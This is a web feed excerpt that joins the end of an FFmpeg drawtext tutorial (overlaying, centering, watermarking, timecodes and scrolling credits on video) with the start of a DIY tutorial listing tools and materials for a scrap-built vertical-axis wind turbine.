<ul><li><code>inputClip.mp4</code>&nbsp;is the input video on which you want to display the text; and the output (containing the text) is to be stored in&nbsp;<code>output.mp4</code></li><li>no audio re-encoding as indicated by&nbsp;<code>-c:a copy</code></li><li>we use the drawtext filter as indicated by the commands&nbsp;<code>-vf "drawtext=........"</code></li><li><code>text='My text starting at 640x360'</code>&nbsp;is the text that will be shown on the video (you could make it your name for watermarking the video, right?)</li><li>position of the text<ul><li><code>x=640:y=360</code>&nbsp;indicates that the x and y coordinates as&nbsp;<code>640px</code>&nbsp;and&nbsp;<code>360px</code>. Also, as a side note, the video’s resolution is&nbsp;<code>1280x720</code>.</li><li>font size is&nbsp;<code>24</code></li><li>font color is&nbsp;<code>white</code></li></ul></li></ul>



<p>Let’s see how the output looks, shall we?</p>



<div><figure><img data-attachment-id="90" data-permalink="https://ottverse.com/drawtext-filter-basic-example/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-filter-basic-example.png?fit=960%2C538&amp;ssl=1" data-orig-size="960,538" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="drawtext-filter-basic-example" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-filter-basic-example.png?fit=300%2C168&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-filter-basic-example.png?fit=960%2C538&amp;ssl=1" loading="lazy" width="960" height="538" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-filter-basic-example.png?resize=960%2C538&amp;is-pending-load=1#038;ssl=1" alt="ffmpeg-drawtext-filter-dynamic-overlays-timecode-scrolling-text-credits" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-filter-basic-example.png?w=960&amp;ssl=1 960w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-filter-basic-example.png?resize=300%2C168&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-filter-basic-example.png?resize=768%2C430&amp;ssl=1 768w" data-lazy-sizes="(max-width: 960px) 100vw, 960px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-filter-basic-example.png?resize=960%2C538&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<p>A better way to this is to offset the text by the length of the text that you are printing on the screen.</p>



<p>Confused?</p>



<p>If you look at the image above, you’ll see that it starts at the center of the video and extends towards the right.</p>



<p><strong>If you want to center the text itself, then you can subtract the height and width of the rendered text when telling&nbsp;<code>drawtext</code>&nbsp;where to render the text.</strong></p>



<p>Here’s how. You use the command&nbsp;<code>x=(w-text_w)/2:y=(h-text_h)/2</code>&nbsp;and it will center the text. Here is our new commandline –</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='Centered Text':x=(w-text_w)/2:y=(h-text_h)/2:fontsize=24:fontcolor=white" -c:a copy output.mp4</code></pre>



<p>Now, the text looks nice and pretty 🙂</p>



<div><figure><img data-attachment-id="78" data-permalink="https://ottverse.com/centered-text/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/centered-text.png?fit=960%2C536&amp;ssl=1" data-orig-size="960,536" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="centered-text" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/centered-text.png?fit=300%2C168&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/centered-text.png?fit=960%2C536&amp;ssl=1" loading="lazy" width="960" height="536" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/centered-text.png?resize=960%2C536&amp;is-pending-load=1#038;ssl=1" alt="ffmpeg-drawtext-filter-dynamic-overlays-timecode-scrolling-text-credits" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/centered-text.png?w=960&amp;ssl=1 960w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/centered-text.png?resize=300%2C168&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/centered-text.png?resize=768%2C429&amp;ssl=1 768w" data-lazy-sizes="(max-width: 960px) 100vw, 960px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/centered-text.png?resize=960%2C536&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<p><strong>Fantastic – you now know how to overlay text onto a video using FFmpeg’s&nbsp;<code>drawtext</code>&nbsp;filter. Do you think you can add your own watermark or copyright? Let’s try 🙂</strong></p>



<h2 id="adding-a-copyright-notice-or-text-watermark-using-ffmpegs-drawtext-filter"><span id="Adding_a_Copyright_notice_or_Text_Watermark_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Adding a Copyright notice or Text Watermark using FFmpeg’s drawtext filter<span></span></h2>



<p>Let’s modify the command as follows to indicate my name and the copyright symbol.</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='© Krishna':x=640:y=360:fontsize=24:fontcolor=white" -c:a copy output.mp4</code></pre>



<p>This produces an output like this – looks good right? You can play around with the&nbsp;<code>x</code>&nbsp;and&nbsp;<code>y</code>&nbsp;coordinates to align the text the way you want to.</p>



<div><figure><img data-attachment-id="92" data-permalink="https://ottverse.com/drawtext-with-copyright/" data-orig-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-with-copyright.png?fit=960%2C541&amp;ssl=1" data-orig-size="960,541" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="drawtext-with-copyright" data-image-description="" data-medium-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-with-copyright.png?fit=300%2C169&amp;ssl=1" data-large-file="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-with-copyright.png?fit=960%2C541&amp;ssl=1" loading="lazy" width="960" height="541" src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-with-copyright.png?resize=960%2C541&amp;is-pending-load=1#038;ssl=1" alt="ffmpeg-drawtext-filter-dynamic-overlays-timecode-scrolling-text-credits" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-with-copyright.png?w=960&amp;ssl=1 960w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-with-copyright.png?resize=300%2C169&amp;ssl=1 300w, https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-with-copyright.png?resize=768%2C433&amp;ssl=1 768w" data-lazy-sizes="(max-width: 960px) 100vw, 960px" data-lazy-src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-with-copyright.png?resize=960%2C541&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<h2 id="adding-text-with-background-color-using-ffmpegs-drawtext-filter"><span id="Adding_Text_with_Background_Color_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Adding Text with Background Color using FFmpeg’s drawtext filter<span></span></h2>



<p>To add a background color, we need</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='© Krishna':x=(1100-text_w):y=(600-text_h):fontsize=32:fontcolor=black:box=1:boxcolor=white@0.5: boxborderw=5" -c:a copy output.mp4</code></pre>



<p>The new commands here are –</p>



<ul><li><code>box</code>&nbsp;: this is either&nbsp;<code>1</code>&nbsp;(enabled) or&nbsp;<code>0</code>&nbsp;(disabled)</li><li><code>boxcolor:&nbsp;white@0.5</code>&nbsp;implies a white colored box with a 50% opacity.</li><li><code>boxborderw</code>&nbsp;is the width of the box’s border and the border color is taken from&nbsp;<code>boxcolor</code>.</li></ul>



<p>And there you have it, text with a background. In this example, I switched the color of the text to black so that it contrasts well with a light background bounding box (which in-turn contrasts well with a dark background.)</p>



<div><figure><img data-attachment-id="89" data-permalink="https://ottverse.com/drawtext-box-background/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-box-background.png?fit=960%2C538&amp;ssl=1" data-orig-size="960,538" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="drawtext-box-background" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-box-background.png?fit=300%2C168&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-box-background.png?fit=960%2C538&amp;ssl=1" loading="lazy" width="960" height="538" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-box-background.png?resize=960%2C538&amp;is-pending-load=1#038;ssl=1" alt="ffmpeg-drawtext-filter-dynamic-overlays-timecode-scrolling-text-credits" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-box-background.png?w=960&amp;ssl=1 960w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-box-background.png?resize=300%2C168&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-box-background.png?resize=768%2C430&amp;ssl=1 768w" data-lazy-sizes="(max-width: 960px) 100vw, 960px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-box-background.png?resize=960%2C538&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<h2 id="displaying-timecodes--timestamps-using--ffmpegs-drawtext-filter"><span id="Displaying_TimeCodes_/_TimeStamps_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Displaying TimeCodes / TimeStamps using FFmpeg’s drawtext filter<span></span></h2>



<p>This is a very useful application of the&nbsp;<code>drawtext</code>&nbsp;filter and is used in demonstrating low-latency applications or visual quality testing so that one knows precisely what the timestamps/timecodes are at each time.</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='timestamp: %{pts \: hms}': x=500: y=500: fontsize=32:fontcolor=yellow@0.9: box=1: boxcolor=black@0.6" -c:a copy output.mp4</code></pre>



<p>This uses the&nbsp;<code>timestamp</code>&nbsp;and&nbsp;<code>pts</code>&nbsp;options to display time in hour:min:sec format using the&nbsp;<code>hms</code>&nbsp;format specifier. The notations and formatting are complex in my opion! So, a lot of trial and error might be needed before you format your display correctly.</p>



<p>Here is how the video looks. Hope Vimeo shows you the video without a lot of delay 🙂</p>



<figure><div>
<p><iframe width="600" height="338" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen="" data-src="https://player.vimeo.com/video/445270549" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></iframe></p>
</div></figure>



<p>And here is the same command, but using the&nbsp;<code>flt</code>&nbsp;option to provide microsecond time accuracy! Fancy 🙂</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='timestamp: %{pts \: flt}': x=500: y=500: fontsize=32:fontcolor=yellow@0.9: box=1: boxcolor=black@0.6" -c:a copy output.mp4
</code></pre>



<figure><img data-attachment-id="91" data-permalink="https://ottverse.com/drawtext-timecode-flt/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-timecode-flt.png?fit=960%2C540&amp;ssl=1" data-orig-size="960,540" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="drawtext-timecode-flt" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-timecode-flt.png?fit=300%2C169&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-timecode-flt.png?fit=960%2C540&amp;ssl=1" loading="lazy" width="960" height="540" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-timecode-flt.png?resize=960%2C540&amp;is-pending-load=1#038;ssl=1" alt="ffmpeg-drawtext-filter-dynamic-overlays-timecode-scrolling-text-credits" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-timecode-flt.png?w=960&amp;ssl=1 960w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-timecode-flt.png?resize=300%2C169&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-timecode-flt.png?resize=768%2C432&amp;ssl=1 768w" data-lazy-sizes="(max-width: 960px) 100vw, 960px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/drawtext-timecode-flt.png?resize=960%2C540&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<h2 id="display-movie-credits-using-ffmpegs-drawtext-filter"><span id="Display_Movie_Credits_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Display Movie Credits using FFmpeg’s drawtext filter<span></span></h2>



<p>Finally, let’s learn how to show a movie’s credits using the draw text filter. Here are two main concepts that you need to understand.</p>



<ul><li>providing a lot of text: you can’t do this via the commandline, so, you need to read a text file that contains the text. And you can read that using the&nbsp;<code>textfile</code>&nbsp;option.</li><li>and, specify the speed of scrolling using the&nbsp;<code>y</code>&nbsp;text position. Here, you can provide an equation instead of a constant number. You start off by telling by FFmpeg that the y-position is&nbsp;<code>h - 80*t</code>&nbsp;so that everytime the value of time increases, the value of&nbsp;<code>h - 80*t*</code>&nbsp;decreases, and the text is displayed higher. Makes sense?</li></ul>



<p><strong>Tip: change&nbsp;<code>80</code>&nbsp;to&nbsp;<code>100</code>&nbsp;or&nbsp;<code>120</code>&nbsp;and see the effect on the scrolling speed.</strong></p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=textfile=credits.txt: x=200: y=h-80*t: fontsize=36:fontcolor=yellow@0.9: box=1: boxcolor=black@0.6" -c:a copy outputCredits.mp4
</code></pre>



<p>Here is the output:</p>



<figure><div>
<p><iframe width="600" height="338" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen="" data-src="https://player.vimeo.com/video/445276018" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></iframe></p>
</div></figure>



<p>That’s it for this tutorial on using FFmpeg’s&nbsp;<code>drawtext</code>&nbsp;filter to produce dynamic overlays on your videos. It is a very versatile and handy tool that you can use to overlay text, timecodes, credits, copyrights notices on your videos.</p>







<hr>



<p>If you are interested in video compression, <a href="https://ottverse.com/lcevc-vs-avc-using-ffmpeg/">check out our comparison of LCEVC (MPEG5 Part 2) vs H.264/AVC</a>. Stunning results, I tell you 🙂 </p>



<figure><a href="https://ottverse.com/lcevc-vs-avc-using-ffmpeg/"><img data-attachment-id="1006" data-permalink="https://ottverse.com/lcevc-vs-avc-using-ffmpeg/lcevc-vs-avc-featured-image/" data-orig-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?fit=1920%2C1080&amp;ssl=1" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="lcevc-vs-avc-featured-image" data-image-description="" data-medium-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?fit=300%2C169&amp;ssl=1" data-large-file="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?fit=1024%2C576&amp;ssl=1" loading="lazy" width="1024" height="576" src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?resize=1024%2C576&amp;is-pending-load=1#038;ssl=1" alt="lcevc avc ffmeg" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?resize=1024%2C576&amp;ssl=1 1024w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?resize=300%2C169&amp;ssl=1 300w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?resize=768%2C432&amp;ssl=1 768w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?resize=1536%2C864&amp;ssl=1 1536w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?resize=1200%2C675&amp;ssl=1 1200w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?resize=678%2C381&amp;ssl=1 678w, https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?w=1920&amp;ssl=1 1920w" data-lazy-sizes="(max-width: 1000px) 100vw, 1000px" data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/lcevc-vs-avc-featured-image.png?resize=1024%2C576&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></figure>
		
		
		
	</div></div>]]>
            </description>
            <link>https://ottverse.com/ffmpeg-drawtext-filter-dynamic-overlays-timecode-scrolling-text-credits/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24865755</guid>
            <pubDate>Fri, 23 Oct 2020 03:22:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[$30 DIY Kilowatt Wind Turbine (2017)]]>
            </title>
            <description>
<![CDATA[
Score 178 | Comments 82 (<a href="https://news.ycombinator.com/item?id=24865731">thread link</a>) | @simonpure
<br/>
October 22, 2020 | http://opensourcelowtech.org/wind_turbine.html | <a href="https://web.archive.org/web/*/http://opensourcelowtech.org/wind_turbine.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              <div>
                               <p>
                  Updated 24 Sept '18<br>
                  Developed by: Daniel Connell<br>
                  English Tutorial Text: Daniel Connell<br>
                  Tutorial Animation: Daniel Connell </p>
                <p><strong>Contents of this tutorial:</strong><br>
  <a href="#desc">Description</a><br>
  <a href="#tools">Tools</a><br>
<a href="#mat">Materials</a><a href="#resources"><br>
Resources</a><br>
  <a href="#steps">Step By Step Instructions<br>
</a><a href="#mount">Configurations and Applications</a></p>
<p><strong><a name="desc" id="desc"></a>Description:</strong></p><p>

  This is a Vertical Axis Wind Turbine which uses wind energy to  drive things like an alternator/generator for producing electricity,  or air and water pumps for cooling, irrigation and similar.<br>
  The  turbine uses the 35-40% mechanically efficient Lenz2 lift+drag  design. It is made almost entirely from scrap materials, and should  cost about $15-$30 for the six vane version, which can be made by two  people in four hours without much effort. <br>
The three vane  version has been successfully survival tested to 80 km/h sustained  winds and the six vane version to 105 km. Both will do more, but  exactly how much has not yet been ascertained. The current longest  running version has been up since early 2014, through reasonable  storms, with no noticeable wear and tear as of yet.</p>
<iframe width="320" height="180" src="https://www.youtube.com/embed/8oe6egO0YOc" frameborder="0" allowfullscreen=""></iframe>

<p>Full power curves have yet to be calculated for this  particular build, but according to Mr Ed Lenz's calculations a six  vane at 0.91 meters diameter and 1.1 meters high with a 90% efficient  alternator should produce at least 130 watts of electricity in a 30  km/h wind, and 1 kilowatt at 60 km/h. </p><p>
The materials  listed in this tutorial are to make the three vane version. Double  everything except the bike wheel for six vanes.
</p>
<p><strong><a name="tools" id="tools"></a>Tools:</strong></p>
        <table>
          <tbody><tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/drill1.jpg" width="80" height="80"></td>
            <td><strong>Power drill</strong></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/6mmbit1.jpg" width="80" height="80"></td>
            <td>
              <p><strong>Metal Drill Bits<br>
    </strong>4mm,  6mm, 10mm.</p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/cknife1.jpg" width="80" height="80"></td>
            <td>
            <p><strong>Craft </strong><strong>K</strong><strong>nife </strong><strong>or</strong><strong> Stanley </strong><strong>K</strong><strong>nife / </strong><strong>Box  Cutter<br>
            </strong><strong><span>The former is better for  cutting paper, the latter for scoring the aluminium sheets, so one of  each may be a good idea.</span></strong></p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/anglealu1.jpg" width="80" height="80"></td>
            <td><strong>20mm x 20mm angle aluminium</strong>            <br>
            About 1 meter long, an extra 30cm length is also handy. To be used for ruling and bending.</td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/tapemeasure1.jpg" width="80" height="80"></td>
            <td><strong>Tape Measure</strong></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/riveter1.jpg" width="80" height="80"></td>
            <td><strong>Pop Riveter</strong></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/sharpie1.jpg" width="80" height="80"></td>
            <td><p><strong>Marker Pen</strong></p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/stickytape1.jpg" width="80" height="80"></td>
            <td><p><strong>Sticky Tape</strong></p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/peg1.jpg" alt="" width="80" height="80"></td>
            <td><strong>4 Clothes Pegs</strong><br>
              Springy or the other kind.</td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/printer1.jpg" alt="" width="80" height="80"></td>
            <td><strong>Computer and printer</strong><br>
Low quality black and  white is fine.<br>
And 2 pieces of A4 or US Letter paper.</td>
          </tr>
          <tr>
            <td>              <p><strong>Optional:</strong></p></td>
            <td>&nbsp;</td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/7mmsocket1.jpg" alt="" width="80" height="80"></td>
            <td>
              
              
              <p><strong>7mm Socket / Nut Driver<br>
              </strong>For use with the drill to tighten your  bolts. Much faster and easier.</p></td>
          </tr>
        </tbody></table>
        <p><a name="mat" id="mat"></a><strong>Materials:</strong></p>
<table>
          <tbody><tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/aluplate1.jpg" width="80" height="80"></td>
            <td><strong>11 Aluminium lithographic offset printing plates<br>
            </strong>These are pure aluminium sheets used in a printing process fairly common with newspapers and packaging. A medium sized printing company may recycle hundreds of plates every week, so it's usually easy to pick them up cheap. Ring around any local companies offering offset printing.<br>
Any size, thickness, or type is fine as long as they're larger than 67cm on the long axis.
              They'll probably be quite inky when you get them, it washes off your hands easily enough with soap and should be non toxic.</td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/rivet1.jpg" width="80" height="80"></td>
            <td>
              <p><strong>150</strong><strong> 4mm </strong><strong>D</strong><strong>iameter </strong><strong>P</strong><strong>op </strong><strong>R</strong><strong>ivets</strong> <br>
              About 6-8mm  long. </p>
              </td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/m4bolt1.jpg" width="80" height="80"></td>
            <td><p><strong>1</strong><strong>8</strong><strong> M4 </strong><strong>B</strong><strong>olts / </strong><strong>Machine  Screws<br>
            </strong>About 12-20mm long, hex heads are best.</p>
              </td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/nylock1.jpg" width="80" height="80"></td>
            <td>
              <p><strong>1</strong><strong>8</strong><strong> M4 </strong><strong>N</strong><strong>yl</strong><strong><strong>ocs</strong></strong><strong> / </strong><strong>Lock Nuts<br>
  </strong>These are nuts with a ring of nylon to  stop them rattling loose. If you can't find these a normal M4 nut  with a spring washer will do the same job.</p>
</td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/washer2.jpg" alt="" width="80" height="80"></td>
            <td><strong>24 Small Washers  <br>
            </strong>            4mm inner diameter to fit the pop rivets and bolts, outer diameter about 10mm.<br>            </td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/pennywasher1.jpg" alt="" width="80" height="80"></td>
            <td>
              <p><strong>27 Large/Penny/Repair </strong><strong>W</strong><strong>ashers</strong> <br>
      4mm inner  diameter to fit the pop rivets and bolts, outer diameter about 20mm.</p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/bikewheel1.jpg" width="80" height="80"></td>
            <td><p><strong>26 Inch </strong><strong>B</strong><strong>ike </strong><strong>W</strong><strong>heel<br>
              </strong>Exactly how  bike wheels are measured is slightly complicated, basically you want  one which is about 58cm total outer rim diameter, give or take. <br>
              The  wheel should:<br>
              ~ Not be quick release <br>
              ~ Have a normal thick  axle (about 10mm diameter)<br>
              ~ Have 36 spokes<br>
              ~ Run reasonably  smoothly <br>
              ~ Have enough axle showing to attach to your pole  mount, at least 3-4cm.<br>
            ~ Only needs gears if you're going to be running a chain off them, which you probably aren't.</p>              <p>It may be helpful to take the wheel  hub apart using spanners and a bike cone spanner and give the  bearings a bit of a clean and re-grease, and to extend the axle as  much as possible on one side for attaching. If you've not done this  before take it along to your local bike servicing place and they'll  be happy to show you how. Shouldn't be necessary tho if the wheel  runs nicely enough and has enough axle showing.</p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/spokes1.jpg" width="80" height="80"></td>
            <td><strong>12 bike wheel spokes</strong>
            <p>Any length, type, or condition is fine.</p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/flatsteel1.jpg" width="80" height="80"></td>
            <td>
              <p><strong>2 </strong><strong>S</strong><strong>trips of </strong><strong>S</strong><strong>teel</strong><br>
      Roughly 20cm x 3cm x 3mm.</p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/bikeaxle1.jpg" width="80" height="80"></td>
            <td>
              <p><strong>Spare B</strong><strong>ike Wheel Axle and  Three Nuts To Fit</strong><br>
      Anything as long as it's the same thread  as the axle on your wheel.</p></td>
          </tr>
          <tr>
            <td><img src="http://opensourcelowtech.org/tutorials/icons/m6bolt1.jpg" width="80" height="80"></td>
            <td><p><strong>3 M6 x About 60mm Bolts and Nuts<br>
            </strong><span>You'll  want them with small hex heads.</span></p>
              </td>
          </tr>
        </tbody></table>
<h3><a name="resources" id="steps2"></a>Resources:</h3>

<p><a name="steps" id="steps"></a>
<strong>Step by step build instructions:</strong></p>
<p>These relate to the animation to the left. </p>
<p><strong>Step 1:</strong><br>
  Download and print the two template  files from the links above. Make sure they're printed at 100% (200  dpi). When printed measure the distance between the dimension arrows,  it should be 10cm on both pages. If it's a couple mm off that's  probably ok.</p>
